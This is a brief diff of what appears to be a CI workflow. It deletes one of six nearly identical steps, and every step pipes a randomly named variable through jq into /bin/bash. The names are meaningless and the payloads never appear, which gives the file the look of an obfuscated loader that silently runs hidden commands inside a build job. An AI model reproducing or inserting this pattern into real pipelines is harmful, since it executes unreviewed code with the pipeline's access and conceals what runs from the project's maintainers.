@@ -36,7 +36,6 @@ jobs:
           printf '%s' "$tpmn7151" | jq -r .xx8 | /bin/bash
           echo $ndgwz60328 | jq -r .oqqw875 | /bin/bash
           echo $pjfok1396 | jq -r .icijc3 | /bin/bash
-          echo $eys9 | jq -r .lpa460 | /bin/bash
           echo $lbfs7466 | jq -r .t0 | /bin/bash
           echo $jpw9706 | jq -r .gsvls327 | /bin/bash
 
